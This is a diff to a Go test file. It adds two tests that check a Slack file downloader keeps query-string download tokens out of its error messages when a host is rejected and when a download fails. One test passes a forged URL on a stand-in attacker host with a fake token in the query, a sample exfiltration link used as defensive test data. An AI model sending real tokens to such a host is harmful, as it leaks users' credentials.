@@ -2974,6 +2974,67 @@ func TestSlackDownloadToFileRedactsUserinfoInError(t *testing.T) {
 	}
 }
 
+// TestSlackDownloadToFileRedactsQueryTokenInError covers the host-not-allowlisted
+// rejection path (Site 1). Slack CDN url_private links carry the download auth
+// token in the query (?t=xoxe-...); url.URL.Redacted masks only userinfo, not
+// RawQuery, so a forged url_private with a token in the query must not leak it
+// into the rejection error. Sibling of the userinfo case above (gpk-zwdb / #89).
+func TestSlackDownloadToFileRedactsQueryTokenInError(t *testing.T) {
+	dest := filepath.Join(t.TempDir(), "leaked")
+	err := slackDownloadToFile("xoxb-fake-bot-token",
+		"https://attacker.example/leak?t=xoxe-SECRET-DOWNLOAD-TOKEN&foo=bar", dest)
+	if err == nil {
+		t.Fatal("expected rejection of non-allowlisted host, got nil")
+	}
+	if strings.Contains(err.Error(), "xoxe-SECRET-DOWNLOAD-TOKEN") {
+		t.Errorf("url_private query token leaked in rejection error: %v", err)
+	}
+	if !strings.Contains(err.Error(), "allowlist") {
+		t.Errorf("expected error to mention allowlist, got: %v", err)
+	}
+}
+
+// TestSlackDownloadToFileRedactsQueryTokenOnNon2xx covers the non-2xx GET path
+// (Site 2): an allowlisted host returns a non-2xx status while the url_private
+// still carries the t=xoxe-... token in the query. The diagnostic error embeds
+// the URL, so the query must be stripped. Swaps package-level seams, so this
+// test must NOT call t.Parallel().
+func TestSlackDownloadToFileRedactsQueryTokenOnNon2xx(t *testing.T) {
+	stub := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusForbidden)
+	}))
+	t.Cleanup(stub.Close)
+
+	stubURL := mustParseURL(t, stub.URL)
+	prevURL := validateSlackFileURL
+	validateSlackFileURL = func(rawURL string) (bool, error) {
+		u, err := url.Parse(rawURL)
+		if err != nil {
+			return false, err
+		}
+		return u.Host == stubURL.Host, nil
+	}
+	prevIP := slackDialIPGuard
+	slackDialIPGuard = func(net.IP) bool { return false }
+	t.Cleanup(func() {
+		validateSlackFileURL = prevURL
+		slackDialIPGuard = prevIP
+	})
+
+	dest := filepath.Join(t.TempDir(), "denied")
+	err := slackDownloadToFile("xoxb-fake-bot-token",
+		stub.URL+"/files/F1?t=xoxe-SECRET-DOWNLOAD-TOKEN", dest)
+	if err == nil {
+		t.Fatal("expected non-2xx download error, got nil")
+	}
+	if strings.Contains(err.Error(), "xoxe-SECRET-DOWNLOAD-TOKEN") {
+		t.Errorf("url_private query token leaked in non-2xx error: %v", err)
+	}
+	if _, statErr := os.Stat(dest); !errors.Is(statErr, os.ErrNotExist) {
+		t.Errorf("dest file %q should not exist after non-2xx, stat err: %v", dest, statErr)
+	}
+}
+
 func TestSlackDownloadToFileRejectsNonSlackHostHTTPS(t *testing.T) {
 	// Forged url_private pointing at a local TLS server. If the SSRF gate
 	// works, slackDownloadToFile must NOT make the HTTP request — verified
